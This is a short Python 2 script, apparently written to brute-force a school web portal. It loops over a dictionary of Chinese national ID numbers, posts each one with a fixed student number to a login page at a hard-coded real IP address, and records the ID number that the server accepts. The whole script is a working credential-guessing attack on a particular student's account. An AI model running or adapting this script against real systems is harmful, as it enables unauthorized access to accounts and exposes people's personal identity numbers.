#coding=utf-8
import time
import urllib
import urllib2
import httplib


def TrySfzh():
    global fsfzh
    global fresult
    global headers
    xh=1312060201 #学号
    result=0
    for sfzh in fsfzh:
        if result==1:
            break
        else:
            responseText=''
            sfzh=sfzh.strip()
            conn=httplib.HTTPConnection("211.70.176.123")
            params=urllib.urlencode({'xh':xh,'sfzh':sfzh})
            conn.request(method="POST",url='/wap/index.asp',body=params,headers=headers)
            responseText=conn.getresponse().read().decode('gb2312')
            if sfzh[15:18]=='999':
                print sfzh
            time.sleep(1)
            if not responseText.find(u'对不起') > 0:
                print '-----find xh:',xh,'    ','sfzh:',sfzh,'-----'
                fresult.write(sfzh)
                result=1
    return 0

fsfzh=open('sfzh.txt','r') #身份证号字典
fresult=open('result.txt','w')
headers={"Content-Type":"application/x-www-form-urlencoded",
        "Connection":"keep-alive",
        "Referer":"http://211.70.176.123/wap/"}

if __name__ == '__main__':
    print 'TrySfzh is runing...'
    TrySfzh()
    fsfzh.close()
    fresult.close()
    print 'TrySfzh is stoped'
        
        
        
